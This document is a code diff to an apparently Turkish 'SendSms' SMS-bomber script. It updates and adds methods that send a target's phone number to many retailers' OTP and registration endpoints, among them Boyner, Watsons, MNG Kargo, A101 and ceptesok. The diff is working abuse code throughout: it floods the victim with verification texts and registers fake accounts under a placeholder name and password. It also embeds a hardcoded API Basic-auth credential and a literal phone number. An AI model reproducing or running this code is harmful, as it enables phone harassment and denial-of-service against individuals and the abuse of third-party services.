@@ -140,25 +140,7 @@ class SendSms():
         except:    
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> kahvedunyasi.com")
         
-
-    #watsons.com.tr--sms
-    # def watsons(self):    
-    #     try:
-    #         watsons = requests.post("https://www.watsons.com.tr/Customer/VerifyPhoneNumber", data={
-    #             "phoneNumber": self.phone,
-    #             "email": f"{self.random_mail}@gmail.com",
-    #             "isLogin": "false",
-    #             "getCustomerPhone": "false"
-    #         }, headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0"})
-    #         if watsons.json()["Success"] == True:
-    #             print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> watsons.com.tr")
-    #             self.adet += 1
-    #         else:
-    #             raise
-    #     except:
-    #         print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> watsons.com.tr")
-        
-
+ 
     # babyturco.com--sms
     def babyTurco(self):    
         try:
@@ -317,12 +299,9 @@ class SendSms():
     #istegelsin.com--sms--zaman-2dk
     def isteGelsin(self):
         try:
-            istegelsin = requests.post("https://prod.fasapi.net/", data=dumps({"query": "\n        mutation SendOtp2($phoneNumber: String!) {\n          sendOtp2(phoneNumber: $phoneNumber) {\n            alreadySent\n            remainingTime\n          }\n        }",
-                    "variables": {
-                        "phoneNumber": "90"+self.phone
-                    }
-                }))
-            if istegelsin.json()["data"]["sendOtp2"]["alreadySent"] == False:
+            json={"operationName": "SendOtp2", "query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}", "variables": {"phoneNumber": "90"+str(self.phone)}}
+            r = requests.post("https://prod.fasapi.net:443/",  json=json)
+            if (r.json()["data"]["sendOtp2"]["alreadySent"]) == False:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> istegelsin.com")
                 self.adet += 1
             else:
@@ -347,9 +326,8 @@ class SendSms():
     #ceptesok.com--sms--zaman-1dk
     def sok(self):
         try:
-            json={"mobile_number": self.phone, "token_type": "register_token"}
-            sok = requests.post("https://api.ceptesok.com:443/api/users/sendsms",  json=json)
-            if len(sok.json()["meta"]["messages"]["error"]) == 0:
+            r = requests.post("https://api.ceptesok.com:443/api/users/sendsms",  json={"mobile_number": self.phone, "token_type": "register_token"})
+            if len(r.json()["meta"]["messages"]["success"]) != 0:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> ceptesok.com")
                 self.adet += 1
             else:
@@ -394,11 +372,8 @@ class SendSms():
     #A101 Kapida--sms
     def yuzbir(self):
         try:
-            url = "https://kapida.akinon.net:443/a101-app/users/registration/"
-            headers = {"Content-Type": "multipart/form-data; boundary=_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-tr", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://kapida.akinon.net/", "User-Agent": "A101%20Kapida/1 CFNetwork/1240.0.4 Darwin/20.6.0", "X-Csrftoken": "yuqNcGjogZEPwScxl6qXjKPSQljBJhc9e3fK1uuHvZgBH91lxFYpPl1rbPjUeGB6"}
-            data = f"--_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.random_mail}@gmail.com\r\n--_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF\r\ncontent-disposition: form-data; name=\"repeatEmail\"\r\n\r\n{self.random_mail}\r\n--_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF\r\ncontent-disposition: form-data; name=\"confirm2\"\r\n\r\nfalse\r\n--_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\nfalse\r\n--_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF\r\ncontent-disposition: form-data; name=\"tom_pay_allowed\"\r\n\r\nfalse\r\n--_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF--\r\n"
-            yuzbir = requests.post(url, headers=headers,  data=data)
-            if yuzbir.json()["phone"] == f"0{self.phone}":
+            r = requests.post("https://kapida.akinon.net:443/users/otp-login/", json={"phone": "0"+str(self.phone)})
+            if (r.status_code) == 200:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> a101.com.tr")
                 self.adet += 1
             else:
@@ -485,17 +460,15 @@ class SendSms():
     #apaydinsupermarket.com
     def Aydin(self):
         try:
-            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.apaydinsupermarket.com", "Dnt": "1", "Referer": "https://www.apaydinsupermarket.com/urunler/309/kurdan", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
-            data = {"cepTel": self.phone}
-            aydin = requests.post("https://www.apaydinsupermarket.com/uye/uyeolMobile", headers=headers, data=data)
-            if aydin.json()["result"]["statusMessage"] == "success":
+            r = requests.post("https://apistore.apaydinsupermarket.com:443/api/musteriGirisKayit", data={"cep_tel": "5078214930"})
+            if (r.json()["result"]["status"]) == "OK":
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> apaydinsupermarket.com")
                 self.adet += 1
             else:
-                raise    
+                raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> apaydinsupermarket.com")
-            
+                
             
     #loncamarket.com
     def Lonca(self):
@@ -516,7 +489,7 @@ class SendSms():
     def Bizim(self):
         try:
             headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.bizimtoptan.com.tr", "Dnt": "1", "Referer": "https://www.bizimtoptan.com.tr/register", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
-            data = {"Phone": self.phone, "Email": self.random_mail, "Password": "31ABC..abc31", "Resend": "true"}
+            data = {"Phone": self.phone, "Email": self.random_mail+"@gmail.com", "Password": "31ABC..abc31", "Resend": "true"}
             bizim = requests.post("https://www.bizimtoptan.com.tr/Customer/SendCustomerSmsValidationMessage", headers=headers, data=data)
             if bizim.json()["Success"] == True:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bizimtoptan.com.tr")
@@ -628,3 +601,94 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> icq.net")
+            
+    
+    #boyner.com
+    def Boyner(self):
+        try:
+            url = "https://www.boyner.com.tr:443/v2/customerV2/Register"
+            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.boyner.com.tr/uyelik?type=uye-ol", "X-Newrelic-Id": "Vg8GVlZWCBACUFVRAwkEUFY=", "Newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI5MTcwNTAiLCJhcCI6IjMyMjUzNjA4MiIsImlkIjoiODE3YTIyZTZhODQ0OTJlNCIsInRyIjoiMTM0MWRkZThjZWVmMTExMjQ3MGE4NDQ2M2I1YWU4NzgiLCJ0aSI6MTY3MDU1MzA1OTMzNn19", "Traceparent": "00-1341dde8ceef1112470a84463b5ae878-817a22e6a84492e4-01", "Tracestate": "2917050@nr=0-1-2917050-322536082-817a22e6a84492e4----1670553059336", "Content-Type": "application/json;charset=utf-8", "Origin": "https://www.boyner.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
+            json={"Captcha": "", "CaptchaTurn": False, "ConfirmNewPassword": "31ABC..abc31", "isGuestQuickBuy": "false", "Main": {"CellPhone": self.phone, "day": "31", "Email": self.random_mail+"@gmail.com", "FirstName": "Memati", "genderid": "1", "LastName": "Baş", "month": "12", "ReceiveCampaignMessages": True, "year": 1972}, "MembershipAgreement": True, "MembershipAgreementClone": True, "NewPassword": "31ABC..abc31", "ReturnUrl": "/"}
+            r = requests.post(url, headers=headers, json=json)
+            if r.json()["Success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> boyner.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> boyner.com")
+            
+
+    #mngkargo.com.tr
+    def Mng(self):
+        try:
+            r = requests.post("https://www.mngkargo.com.tr:443/Account/GetSmsActivationCode", data={"phoneNumber": self.phone})
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mngkargo.com.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mngkargo.com.tr")
+
+    
+    #watsons.com.tr
+    def Watsons(self):
+        try:
+            url = "https://www.watsons.com.tr:443/api/v2/wtctr/phone-verification/phonenumber?lang=tr_TR"
+            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.watsons.com.tr/register", "Content-Type": "application/json;charset=UTF-8", "X-Dtpc": "11$208941126_619h150vEGITDHTLQJAGKPKRHUIMTILDMPAWJTOL-0e0", "Origin": "https://www.watsons.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Pragma": "no-cache", "Cache-Control": "no-cache", "Te": "trailers"}
+            json={"countryCode": "TR", "phoneNumber": self.phone}
+            r = requests.post(url, headers=headers, json=json)
+            if r.status_code == 201:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> watsons.com.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> watsons.com.tr")
+            
+    
+    #gunkaysanalmarket.zdc.com.tr--bir kere
+    def GunkayMarket(self):
+        try:
+            url = "https://gunkaysanalmarket.zdc.com.tr:443/fonksiyon.php"
+            data = {"f": "add_new_user", "adsoyad": "Memati Bas", "ceptel": self.phone, "sifre": '', "mail": ''}
+            r = requests.post(url, data=data)
+            if r.json()["status"] == "success":
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> gunkaysanalmarket.zdc.com.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> gunkaysanalmarket.zdc.com.tr")
+            
+    
+    #gunkay.zdc.com.tr--bir kere
+    def Gunkay(self):
+        try:
+            url = "https://gunkay.zdc.com.tr:443/fonksiyon.php"
+            data = {"f": "add_new_user", "adsoyad": "Memati Bas", "ceptel": self.phone, "sifre": '', "mail": ''}
+            r = requests.post(url, data=data)
+            if r.json()["status"] == "success":
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> gunkay.zdc.com.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> gunkay.zdc.com.tr")
+            
+
+    #buyursungelsin.com
+    def Buyur(self):
+        try:
+            url = "https://app.buyursungelsin.com:443/api/customer/form/check"
+            headers = {"Accept": "*/*", "Content-Type": "multipart/form-data; boundary=m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M", "Accept-Encoding": "gzip, deflate", "Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm", "User-Agent": "Gelsinapp/30 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9"}
+            data = f"--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"fonksiyon\"\r\n\r\ncustomer/form/check\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"method\"\r\n\r\nPOST\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"telephone\"\r\n\r\n{self.phone}\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M--\r\n"
+            r = requests.post(url, headers=headers, data=data)
+            if (r.status_code) == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> buyursungelsin.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> buyursungelsin.com")
